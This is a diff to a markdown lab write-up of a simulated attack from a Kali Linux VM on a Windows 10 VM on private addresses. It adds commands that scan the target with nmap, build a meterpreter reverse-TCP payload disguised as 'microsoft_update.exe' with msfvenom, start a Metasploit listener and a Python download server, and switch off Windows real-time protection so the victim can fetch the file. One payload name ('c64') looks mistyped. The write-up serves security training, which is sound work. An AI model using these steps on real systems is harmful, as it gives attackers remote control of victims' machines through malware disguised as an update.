@@ -15,14 +15,57 @@ This is document details the simulated attack from the **Kali Linux Attacker VM*
 
 ## 1. Preparation on Attacker (Kali Linux)
 
-1. Scan the OS information
-```bash
-nmap -A -Pn -n 192.168.20.12
-```
-
-2. Create the payload
+1. Scan the ports and information of the target machine
     ```bash
-    
-
-
+    nmap -A -Pn -n 192.168.20.12
     ```
+![Scanned OS Information](../screenshots/os-info-scan.png)
+
+2. List the available payloads and create one for exploit
+    ```bash
+    msfvenom -l payloads
+
+    msfvenom -p windows/c64/meterpreter_reverse_tcp lhost=192.168.20.11 lport=3344 -f exe -o microsoft_update.exe
+    ```
+![List the payloads](../screenshots/list_the_payloads.png)
+![Payload Created](../screenshots/payload_created.png)
+
+3. Set up a listener
+    ```bash
+    msfconsole
+
+    msf> use exploit/multi/handler
+    msf exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp 
+
+    msf exploit(multi/handler) > set lhost 192.168.20.11
+    msf exploit(multi/handler) > exploit
+    ```
+
+    ![Listener setup](../screenshots/listener_setup.png)
+
+4. Set up http server
+Open another terminal in Linux and use python to establish a temporary server
+*Note: Make sure the new terminal is under the same directory as the payload. Use `ls` to verify
+
+    ```bash
+    python3 -m http.server 9999
+    ```
+![HTTP server set up](../screenshots/http_server.png)
+
+## 2. Delivery and Execution on Windows 10 Victim
+1. Turn of the Firewall on Windows 10 
+    - Find the search box of Taskbar
+    - Type `Windows Security`
+    - Click `Virus & threat Protection`
+    - Click `Manage Settings`
+    - Turn off the `Real-time protection`
+
+![Realtime protection turned off](../screenshots/realtime_protection_off.png)
+
+2. Download the malware from Attacker
+    - Open `Microsoft Edge` browser
+    - Type `192.168.20.11:9999`
+    - Click `microsoft_update.exe` for download 
+
+![Malware downloaded](../screenshots/malware_downloaded.png)
+
